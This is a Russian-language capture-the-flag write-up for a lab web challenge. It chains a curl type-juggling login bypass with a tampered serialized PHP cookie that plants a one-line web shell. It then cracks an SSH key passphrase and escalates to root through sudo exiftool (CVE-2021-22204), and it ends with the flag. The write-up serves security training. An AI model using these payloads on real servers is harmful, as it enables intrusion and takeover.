# How?

## Описание:


| Название | Сложность | Автор |
|------|-----|-------|
| How? | Hard |[@collapsz](https://t.me/collapsz) |

## TLDR:

**Type Juggling**, **Insecure Deserialization**, **exiftool CVE**

---
## Решение:

Веб встречает весьма скудно:

<web>

Фаззинг при помощи `dirsearch`:

<fuzz>

`whatweb` – стек используемых технологий: 

<WW>

Перебор Auth Bypass методик может привести к Type Juggling:

И в самом деле запрос вида 

```
curl -X POST http://how.rdg/admin.php -d username=admin&password[]=
```

Вернет нам 302 код ответа и Set-Cookie, уведомляя об успешной авторизации

<скрин>

Внимательно приглядевшись к содержимому куки или воспользовавшись Burp Scan, можно увидеть ее необычное содержимое: 

<скрин>

Это ничто иное, как сериализованный объект, по содержимому которого становится понятно, что он логирует успешную авторизацию пользователя в файл /var/logs/log.txt 

Мы можем попробовать повлиять на этот процесс. Для этого нам потребуется повторно пройти авторизацию, но изменить куку ДО первого входа, чтобы успешно залогировать его в виде нужной нагрузки в нужном на месте. Для начала посмотрим на изначальный объект:

```
O:4:"User":3:{s:8:"username";s:5:"admin";s:13:"UserlogFile";s:17:"/var/logs/log.txt";s:16:"UserlogContent";s:16:"User logged in: ";}
```

Нам нужно изменить путь до лог-файла и содержимое логфайла.

В качестве нагрузки будем использовать простой однострочный шелл (внимательно смотрим на длину полезной нагрузки, это пригодится в атаке. В нашем случае – 15):

```
<?=`$_GET[0]`?>
```

В качестве пути к лог-файлу воспользуемся стандартной корневой директорией Apache – `/var/www/html`

Удаляем куку, повторно авторизуемся при помощи `Type Juggling`, перехватываем запрос с кукой, и заменяем объект на следующее (чтобы не собирать нагрузку вручную, можно воспользоваться `php serizalize` и `php unserialize` ):

```
O:4:"User":3:{s:8:"username";s:5:"admin";s:13:"UserlogFile";s:24:"/var/www/html/loz678.php";s:16:"UserlogContent";s:15:"<?=`$_GET[0]`?>";}
```

После замены пропускаем запрос на /admin.php и проверяем файл `/loz678.php`:

<скрин шелла>

Пробрасываем себе реверс-шелл и приступаем к перечислению ресурсов системы.

В /mnt/hjfs/delivery находим послание и `приватный ssh ключ`, сбрутив который получаем пассфразу: 

```
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 2 OpenMP threads
Proceeding with wordlist:/usr/share/john/password.lst
Press 'q' or Ctrl-C to abort, almost any other key for status
asshole          (kkknano)     
1g 0:00:02:02 DONE (2025-02-12 02:57) 0.008176g/s 15.82p/s 15.82c/s 15.82C/s 1234qwer..bigbird
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Авторизуемся под пользователем, проверяем sudoers:

```
dalton@28b9dd443e55:~$ sudo -l
sudo -l
Matching Defaults entries for dalton on 28b9dd443e55:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User dalton may run the following commands on 28b9dd443e55:
    (ALL) NOPASSWD: /usr/local/bin/exiftool
```

exiftool – perl скрипт. При помощи `head -n 50 /usr/local/bin/exiftool` можем узнать версию – 12.23:
```
dalton@28b9dd443e55:~$ head -n 50 /usr/local/bin/exiftool
head -n 50 /usr/local/bin/exiftool
#!/usr/bin/perl -w
#------------------------------------------------------------------------------
# File:         exiftool
#
# Description:  Read/write meta information
#
# Revisions:    Nov. 12/03 - P. Harvey Created
#               (See html/history.html for revision history)
#------------------------------------------------------------------------------
use strict;
require 5.004;

my $version = '12.23';
```

Это достаточно быстро выведет нас на (CVE-2021-22204)[https://www.exploit-db.com/exploits/50911]

При помощи эксплоита готовим вредоносную картинку и убеждаемся в работоспособности: 

<скрин id root>

Готовим сплоит на запуск `/bin/bash`, запускаем, получаем шелл

## Flag:
rdg{886891839c6bd6b86d650f9d788c8e08}
